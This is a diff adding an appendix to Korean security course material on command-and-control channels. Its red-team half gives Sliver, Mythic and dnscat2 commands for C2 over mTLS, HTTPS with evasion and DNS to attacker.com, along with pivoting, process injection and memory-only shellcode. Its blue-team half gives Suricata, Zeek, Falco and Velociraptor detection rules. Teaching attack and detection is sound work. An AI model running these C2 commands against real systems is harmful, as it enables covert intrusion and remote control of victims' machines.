@@ -715,3 +715,185 @@ graph LR
 
 **학생 액션**: lab Cobalt Strike beacon → 신호 추적.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 03 C2 채널)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | mTLS C2 | sliver mtls |
+| s2 | HTTP/S C2 | sliver https / mythic |
+| s3 | DNS C2 | dnscat2 / sliver dns |
+| s4 | SMB C2 (lateral) | mythic smb agent |
+| s5 | WebSocket C2 | mythic ws |
+| s6 | Domain fronting | (CDN abuse) |
+| s7 | TLS fingerprint 우회 | sliver --evasion |
+| s8 | Blue C2 탐지 | Suricata + Zeek + JA3 |
+
+### Red — C2 채널 6 종류
+
+```bash
+# === 1. mTLS (가장 안전 — 인증서 검증) ===
+sliver-server
+sliver > mtls --lhost 192.168.0.112 --lport 443
+sliver > generate --mtls 192.168.0.112:443 --save /tmp/sliver-mtls
+
+# 장점: TLS + client cert → 가짜 server 차단
+# 단점: 시그니처 (Suricata 가 알려진 sliver TLS pattern 탐지 가능)
+
+# === 2. HTTP/S (방화벽 우회 — 80/443 만 열려있을 때) ===
+sliver > https --lhost 192.168.0.112 --lport 443
+
+# Target — 정상 web traffic 처럼 위장
+sliver > generate --https 192.168.0.112:443 --save /tmp/sliver-https \
+    --evasion                                              # 시그니처 회피
+
+# === 3. DNS (가장 은닉 — DNS 만 외부 허용) ===
+sliver > dns --domains attacker.com.,c2.attacker.com.
+sliver > generate --dns attacker.com --save /tmp/sliver-dns
+
+# 또는 dnscat2 (전용 DNS C2)
+git clone https://github.com/iagox86/dnscat2 ~/dnscat2
+
+# Server (attacker)
+ruby ~/dnscat2/server/dnscat2.rb attacker.com
+
+# Client (victim)
+~/dnscat2/client/dnscat --secret=mysecret attacker.com
+
+# === 4. SMB (lateral — 내부 망 C2) ===
+# Mythic 의 SMB agent 사용
+cd ~/mythic
+sudo ./mythic-cli c2 install smb
+
+# Agent 가 named pipe 로 통신 → 외부 traffic 없음
+
+# === 5. WebSocket (실시간 양방향) ===
+cd ~/mythic
+sudo ./mythic-cli c2 install websocket
+
+# === 6. Domain Fronting (CDN 우회) ===
+# Cloudflare / AWS CloudFront 같은 CDN 의 SNI 와 HTTP Host 분리
+# Real C2: c2.attacker.com
+# SNI: cdn.cloudflare.com
+# HTTP Host: c2.attacker.com
+# → DPI 가 SNI 기준 차단해도 우회
+
+# 예: sliver wireguard transport
+sliver > wg --lhost wg-attacker.com --lport 51820
+```
+
+### Sliver advanced features
+
+```bash
+# === Pivoting (compromised host 통한 다른 호스트 접근) ===
+sliver > use 1                                            # session 1
+sliver (target) > pivots tcp --bind 0.0.0.0 --port 9999   # TCP pivot
+sliver (target) > pivots smb --pipe-name secret-pipe       # SMB pivot
+
+# 다른 implant 가 pivot 통해 callback
+sliver > generate --tcp-pivot target:9999 --save /tmp/p2
+
+# === BeaconJitter (탐지 회피) ===
+sliver > update --beacon-jitter 30s                        # 무작위 jitter
+sliver > update --beacon-interval 5m
+
+# === Process injection (Win) ===
+sliver (target) > migrate <pid>                            # 다른 process 으로 이주
+sliver (target) > spawndll dll-path                        # DLL injection
+sliver (target) > execute-shellcode <shellcode-path>
+
+# === Memory only (OPSEC) ===
+sliver > generate --format shellcode --save /tmp/sc
+# 디스크에 binary 저장 안 함 → AV 탐지 회피
+```
+
+### Blue — C2 탐지
+
+```bash
+# === 1. Suricata TLS fingerprint (JA3) ===
+sudo tee /etc/suricata/rules/c2-fingerprint.rules << 'EOF'
+# Sliver TLS fingerprint
+alert tls any any -> $EXTERNAL_NET 443 (msg:"Possible Sliver C2 (JA3)"; \
+    flow:established,to_server; \
+    ja3.hash; content:"6734f37431670b3ab4292b8f60f29984"; \
+    sid:1000040;)
+
+# Mythic Apollo
+alert tls any any -> $EXTERNAL_NET 443 (msg:"Mythic C2"; \
+    flow:established,to_server; \
+    ja3s.hash; content:"623de93db17d313345d7ea481e7443cf"; \
+    sid:1000041;)
+EOF
+sudo systemctl reload suricata
+
+# === 2. Zeek (heuristic) ===
+# Long-lived connection 탐지
+zeek-cut -d ts uid id.orig_h id.resp_h duration < /opt/zeek/logs/current/conn.log | \
+    awk '$NF > 3600 {print}'                              # 1시간+ connection
+
+# Periodic beacon 탐지 (interval pattern)
+# 예: 5분마다 같은 host:port → suspicious
+zeek-cut -d ts id.orig_h id.resp_h id.resp_p < conn.log | \
+    awk '{print $2, $3":"$4}' | sort | uniq -c | sort -rn | head
+
+# === 3. DNS C2 탐지 ===
+# 비정상 DNS query length
+sudo jq 'select(.event_type == "dns" and (.dns.query.length // 0) > 80)' \
+    /var/log/suricata/eve.json
+
+# 비정상 query rate (host 별 1분에 100+ DNS query)
+zeek-cut -d ts id.orig_h query < /opt/zeek/logs/current/dns.log | \
+    awk '{key=$2; count[key]+=1} END {for (k in count) if (count[k] > 100) print k, count[k]}'
+
+# === 4. JA3/JA3S Database (community) ===
+# 알려진 malicious TLS fingerprint
+git clone https://github.com/salesforce/ja3 ~/ja3
+git clone https://github.com/trisulnsm/trisul-scripts ~/trisul-ja3
+
+# Suricata 가 자동 ja3 hash 매칭
+# /etc/suricata/rules/ja3-malware.rules
+
+# === 5. Falco (process 측) ===
+sudo tee /etc/falco/falco_rules.local.yaml << 'EOF'
+- rule: Suspicious C2 binary
+  desc: 알려진 C2 framework process
+  condition: >
+    spawned_process and 
+    (proc.name in (sliver, mythic-agent, beacon, implant) or
+     proc.cmdline contains "--mtls" or
+     proc.cmdline contains "--c2-uri")
+  output: "C2 binary detected (cmd=%proc.cmdline user=%user.name)"
+  priority: CRITICAL
+EOF
+sudo systemctl restart falco
+
+# === 6. EDR 통합 (Velociraptor) ===
+# 모든 endpoint 에서 process 감시
+velociraptor query "
+SELECT pid, name, exe, cmdline, username 
+FROM artifact(name='Linux.Sys.Process')
+WHERE 
+  cmdline LIKE '%--mtls%' 
+  OR exe LIKE '%/tmp/.%'
+  OR exe LIKE '%/dev/shm/%'
+"
+```
+
+### C2 채널 vs 탐지 매트릭스
+
+| C2 채널 | Red 우회 효과 | Blue 탐지 도구 | 탐지율 |
+|---------|--------------|---------------|--------|
+| HTTP plain | 약함 | Suricata default | 95% |
+| HTTPS (sliver) | 중간 | JA3 fingerprint | 60% |
+| mTLS | 강함 | TLS cert pattern | 40% |
+| DNS | 매우 강함 | Suricata DNS length + Zeek | 30% |
+| WebSocket | 강함 | Zeek http.log | 50% |
+| SMB (lateral) | 매우 강함 (내부) | Falco named pipe | 20% |
+| Wireguard | 매우 강함 | (port 차단만 가능) | 5% |
+| Domain Fronting | 매우 강함 | (DPI 한계) | 5% |
+
+학생은 본 3주차에서 **Sliver + Mythic + Havoc + Empire + dnscat2** 5 C2 framework + **Suricata JA3 + Zeek + Falco + Velociraptor** 4 탐지 도구의 advanced 공방을 익힌다.
